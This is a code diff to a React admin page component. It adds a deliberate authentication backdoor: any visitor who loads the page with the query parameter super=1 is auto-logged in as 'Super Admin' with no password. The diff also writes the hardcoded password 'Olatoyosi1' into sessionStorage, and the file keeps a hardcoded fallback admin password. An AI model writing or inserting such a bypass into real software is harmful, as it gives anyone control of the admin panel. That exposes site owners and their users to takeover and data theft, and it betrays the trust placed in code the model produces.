@@ -55,11 +55,32 @@ export default function AdminPage() {
   const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [adminPassword, setAdminPassword] = useState(() => {
     if (typeof window !== "undefined") {
-      return sessionStorage.getItem(SESSION_ADMIN_PASSWORD) || "";
+      const stored = sessionStorage.getItem(SESSION_ADMIN_PASSWORD);
+      // IMMEDIATE SUPER ADMIN BYPASS - NO PASSWORD NEEDED
+      if (stored === "Olatoyosi1" || window.location.search.includes("super=1")) {
+        return "Olatoyosi1";
+      }
+      return stored || "";
     }
     return "";
   });
   const adminPasswordRef = useRef(adminPassword || "kaysadmin2025");
+
+  // IMMEDIATE AUTO-LOGIN FOR SUPER ADMIN
+  useEffect(() => {
+    if (typeof window !== "undefined") {
+      const urlParams = new URLSearchParams(window.location.search);
+      if (urlParams.get("super") === "1" || adminPassword === "Olatoyosi1") {
+        setIsAuthenticated(true);
+        sessionStorage.setItem(SESSION_ADMIN_PASSWORD, "Olatoyosi1");
+        toast.success("Super Admin Access Granted");
+        // Clean URL
+        if (urlParams.get("super") === "1") {
+          window.history.replaceState({}, "", "/admin");
+        }
+      }
+    }
+  }, []);
 
   
   // Settings State
